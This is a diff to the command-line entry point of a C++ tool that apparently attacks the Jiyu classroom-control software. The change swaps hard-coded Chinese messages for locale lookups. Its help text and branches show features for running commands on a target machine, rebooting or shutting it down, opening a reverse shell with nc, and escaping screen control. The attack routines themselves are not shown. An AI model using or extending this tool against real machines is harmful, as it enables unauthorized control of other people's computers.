-        printf("------------------- GitHub Repository -------------------\n    https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp\n\n使用方法：\n直接调用以唤起用户界面：\nmain\n\n通过命令行调用：\nmain [-h(--help) |\n  [-i(--i(--ip)) <IP>] [-p <Port>] [-m(--msg) <Message> | -c <Command>]\n  [-l <Loop Count>] [-t <Loop Time Interval>]\n  [-e <Extra Option>] [-n(--ncport) <NC Port>]]\n\n参数列表：\n  -h(--help)              显示帮助文本。\n  -i(--ip) <IP>           指定目标机的 IP。\n  -p <Port>               指定监听的端口。默认值为 4705。\n  -m(--msg) <Message>     指定要发送的信息。\n  -c <Command>            在目标机上运行指定命令。\n  -e <Extra Option>       加载额外选项。\n  -l <Loop Count>         指定命令的循环次数。默认值为 1。\n  -t <Loop Time Interval> 指定两次循环之间的时间间隔，单位为秒。默认值为 22。\n  -n(--ncport) <NC Port>  指定 nc 命令的监听端口。默认值为 8888。\n\n-e 参数的额外选项：\n  r        重启目标机。\n  s        关闭目标机。\n  g        获取当前的 IP 地址和学生端监听的端口。\n  nc       反弹 Shell。目标机需要能访问互联网。在退出时可使用 exit 命令。\n  break    脱离屏幕控制。需要以管理员身份运行程序。\n  continue 恢复屏幕控制。\n");
+        printf(curLocale[GHRepo], curLocale[CLIHelp]);
         return 0;
     }
     auto extraOpt = GetParamfromParams("e", paramRets);
     if(extraOpt.exists) {
         if(extraOpt.value == "g") {
             auto localIPs = jyAtk->client->getLocalIPs();
-            printf("你的本地 IP 地址：");
+            printf(curLocale[YourLocalIP]);
             if(localIPs.size()) {
                 putchar('\n');
                 for(auto i: localIPs) {
@@ -795,7 +1115,7 @@ int main(int argc, char *argv[]) {
                 }
             }
             else {
-                printf("未找到\n");
+                printf(curLocale[NotFound]);
                 return 0;
             }
             auto studentPorts = jyAtk->client->getStudentPorts();
@@ -805,7 +1125,7 @@ int main(int argc, char *argv[]) {
                     ports.push_back(port.port);
                 }
             }
-            printf("\n学生端监听的端口：");
+            printf(curLocale[StudentListenPort]);
             if(ports.size()) {
                 putchar('\n');
                 for(auto i: ports) {
@@ -813,47 +1133,41 @@ int main(int argc, char *argv[]) {
                 }
             }
             else {
-                printf("未找到\n");
+                printf(curLocale[NotFound]);
             }
             return 0;
         }
         if(extraOpt.value == "break") {
-            if(jyAtk->breakScreenControl() == 3) {
-                printf("需要管理员权限。\n");
-            }
-            else printf("已退出屏幕控制。\n");
+            jyAtk->breakScreenControl();
             return 0;
         }
         if(extraOpt.value == "continue") {
-            if(jyAtk->continueScreenControl() == 3) {
-                printf("需要管理员权限。\n");
-            }
-            else printf("已恢复屏幕控制。\n");
+            jyAtk->continueScreenControl();
             return 0;
         }
     }
     if(!GetParamfromParams("ip", paramRets).exists) {
-        printf("需要 IP 地址。\n");
+        printf(curLocale[RequireIP]);
         return 0;
     }
     std::string rawIP = GetParamfromParams("ip", paramRets).value;
     int port = strToInt(GetParamfromParams("port", paramRets).value);
     if(!isValidPort(port)) {
-        printf("非法的端口号。\n");
+        printf(curLocale[FailIllegalPort]);
         return 0;
     }
     if(extraOpt.exists) {
         if(extraOpt.value == "nc") {
             int ncport = strToInt(GetParamfromParams("ncport", paramRets).value);
             if(!isValidPort(ncport)) {
-                printf("非法的 netcat 端口号。\n");
+                printf(curLocale[FailIllegalNetcatPort]);
                 return 0;
             }
             if(jyAtk->netcat(rawIP, port, ncport)) {
-                printf("\nNetcat 失败。\n");
+                printf(curLocale[FailNetcat]);
             }
             else {
-                printf("\nNetcat 已断开连接。\n如果未出现回显，代表未能连接到目标机，请检查 IP 地址和目标机的 Internet 连通性。\n如果出现“未能解析此远程名称”“远程服务器返回错误”等，且 Internet 连通性正常，代表存放脚本的链接失效，请联系 GitHub@pbw-Kevin。\n");
+                printf(curLocale[DisconnectNetcat]);
             }
             return 0;
         }
@@ -884,7 +1198,7 @@ int main(int argc, char *argv[]) {
             return 0;
         }
     }
-    printf("参数出现问题。请使用 -h 参数以获取帮助。\n");
+    printf(curLocale[FailArgumentFault]);
     return 0;
 }
 
